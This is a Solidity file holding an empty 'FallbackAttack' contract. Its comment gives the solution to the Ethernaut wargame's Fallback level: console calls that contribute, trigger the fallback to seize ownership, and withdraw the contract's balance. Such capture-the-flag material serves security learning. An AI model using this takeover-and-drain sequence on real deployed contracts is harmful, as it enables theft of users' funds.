// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IFallback.sol";

/**
 * @title Fallback Attack (Ethernaut Challenge Level 1 - Fallback)
 * @notice There is no way to pass this level via contract call.
 * @dev You can run orderly these scripts in browser:
 * > await contract.contribute({ value: toWei('0.0001') })
 * to make sure check result:
 * > await contract.getContribution()
 * > await contract.sendTransaction({ value: toWei('0.0001') })
 * to make sure check result:
 * > await contract.owner()
 * > await contract.withdraw()
 * to make sure check result:
 * > await getBalance(contract.address)
 * submit
 * @author Emre Tepe (@emretepedev)
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008
 */
// solhint-disable-next-line no-empty-blocks
contract FallbackAttack {

}
